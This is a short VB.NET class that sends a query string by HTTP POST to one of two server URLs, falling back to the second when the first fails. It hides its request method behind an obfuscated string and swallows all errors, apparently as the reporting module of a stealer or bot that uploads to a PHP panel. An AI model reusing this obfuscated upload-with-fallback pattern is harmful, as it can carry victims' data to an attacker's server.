#Region "Imports"

Imports System.Net, System.Net.Sockets
Imports System.Web
Imports System.IO
Imports System.Text

#End Region

Public Class clsPhp

#Region "Functions And Procedures"

    Private Shared Function GetServerResponse(ByVal url As String, ByVal Method As String, ByVal data As String) As Boolean
        Try

            Dim Request As System.Net.WebRequest = System.Net.WebRequest.Create(url)
            Request.Method = Method

            Dim PostData As String = data

            Dim byteArray As Byte() = Encoding.UTF8.GetBytes(PostData)
            Request.ContentType = "application/x-www-form-urlencoded"
            Request.ContentLength = byteArray.Length
            Dim DataStream As Stream = Request.GetRequestStream()
            DataStream.Write(byteArray, 0, byteArray.Length)
            DataStream.Close()

            Dim response As WebResponse = Request.GetResponse()
            response.Close()
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function

    Private Shared Function RequestURL(ByVal mURL As String) As Boolean
        Dim Request As System.Net.WebRequest
        Dim Response As System.Net.WebResponse
        Try
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 Or SecurityProtocolType.Tls12 Or SecurityProtocolType.Tls
            Request = System.Net.WebRequest.Create(mURL)

            Response = Request.GetResponse()
            Return True
        Catch ex As System.Net.WebException
            If ex.Status = Net.WebExceptionStatus.NameResolutionFailure Then
                Return False
            End If
            Return False
        End Try
    End Function

    Public Shared Function SendDataToServer() As Boolean
        MsgBox(clsS.sQuery)
        Try
            If Not GetServerResponse(IIf(RequestURL(clsS.sUrl(0).ToString) = True, clsS.sUrl(0), clsS.sUrl(1).ToString), _
                                     Obf("y8LYvxNFjNRgZqvAyHy2zw=="), clsS.sQuery) Then Return False

            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function

#End Region
End Class
